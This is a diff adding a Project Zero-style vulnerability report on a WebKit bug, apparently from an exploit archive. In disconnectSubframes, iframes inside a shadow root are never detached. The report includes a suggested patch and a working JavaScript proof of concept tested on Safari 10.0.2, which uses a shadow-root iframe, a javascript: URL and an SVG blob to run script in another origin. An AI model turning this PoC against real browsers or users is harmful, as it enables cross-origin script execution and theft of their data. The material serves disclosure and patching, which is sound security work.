@@ -1,0 +1,86 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1074
+
+When an element is removed from a document, the function |disconnectSubframes| is called to detach its subframes(iframe tag, object tag, etc.).
+
+Here is a snippet of |disconnectSubframes|.
+
+void disconnectSubframes(ContainerNode& root, SubframeDisconnectPolicy policy)
+{
+    ...
+    Vector<Ref<HTMLFrameOwnerElement>> frameOwners;
+
+    if (policy == RootAndDescendants) {
+        if (is<HTMLFrameOwnerElement>(root))
+            frameOwners.append(downcast<HTMLFrameOwnerElement>(root));
+    }
+
+    collectFrameOwners(frameOwners, root);
+
+    // Must disable frame loading in the subtree so an unload handler cannot
+    // insert more frames and create loaded frames in detached subtrees.
+    SubframeLoadingDisabler disabler(root);
+
+    bool isFirst = true;
+    for (auto& owner : frameOwners) {
+        // Don't need to traverse up the tree for the first owner since no
+        // script could have moved it.
+        if (isFirst || root.containsIncludingShadowDOM(&owner.get()))
+            owner.get().disconnectContentFrame();
+        isFirst = false;
+    }
+}
+
+The bug is that it doesn't consider |root|'s shadowroot. So any subframes in the shadowroot will be never detached.
+
+It should be like:
+
+    ...
+    collectFrameOwners(frameOwners, root);
+
+    if (is<Element>(root)) {
+        Element& element = downcast<Element>(root);
+        if (ShadowRoot* shadowRoot = element.shadowRoot())
+            collectFrameOwners(frameOwners, *shadowRoot);
+    }
+    ...
+
+
+PoC:
+-->
+
+var d = document.body.appendChild(document.createElement("div"));
+var s = d.attachShadow({mode: "open"});
+
+var f = s.appendChild(document.createElement("iframe"));
+
+f.onload = () => {
+    f.onload = null;
+
+    f.src = "javascript:alert(location)";
+
+    var xml = `
+<svg xmlns="http://www.w3.org/2000/svg">
+<script>
+document.documentElement.appendChild(parent.d);
+
+</sc` + `ript>
+<element a="1" a="2" />
+</svg>`;
+
+    var v = document.body.appendChild(document.createElement("iframe"));
+    v.src = URL.createObjectURL(new Blob([xml], {type: "text/xml"}));
+};
+
+f.src = "https://abc.xyz/";
+
+<!--
+Tested on Safari 10.0.2(12602.3.12.0.1)
+
+I didn’t notice that the method shadowRoot is declared in Node.h. So the following would better make sense.
+
+    collectFrameOwners(frameOwners, root);
+
+    if (ShadowRoot* shadowRoot = root.shadowRoot())
+        collectFrameOwners(frameOwners, *shadowRoot);
+-->
